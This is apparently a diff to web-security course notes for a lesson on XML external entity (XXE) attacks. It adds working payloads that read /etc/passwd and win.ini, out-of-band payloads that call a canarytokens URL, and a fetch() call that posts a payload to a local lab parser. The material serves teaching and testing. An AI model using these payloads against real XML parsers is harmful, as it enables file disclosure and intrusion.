@@ -11,12 +11,69 @@
 
 # Video 6.4
 
+* [Canarytokens](https://canarytokens.org/)
+* [Webhook.site](https://webhook.site/)
+
+
+## Different payloads
+
+```js
+var payload = `<?xml version="1.0"  encoding="UTF-8" ?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM
+  "http://canarytokens.com/URL">
+]>
+<foo>
+  &xxe;
+</foo>`;
+
+fetch("http://localhost:3005/parser", {
+  "headers": {
+    "content-type": "text/xml",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-site"
+  },
+  "referrer": "http://localhost:3001/",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": payload,
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "omit"
+});
+```
+
 ```xml
-<?xml version="1.0" encoding="ISO-8859-1"?> 
+<?xml version="1.0" ?>
 <!DOCTYPE foo [
   <!ELEMENT foo ANY>
   <!ENTITY xxe SYSTEM
   "file:///etc/passwd">
+]>
+<foo>
+  &xxe;
+</foo>
+```
+
+```xml
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM
+  "file:///c:/windows/win.ini">
+]>
+<foo>
+  &xxe;
+</foo>
+```
+
+```xml
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM
+  "http://canarytokens.com/URL">
 ]>
 <foo>
   &xxe;
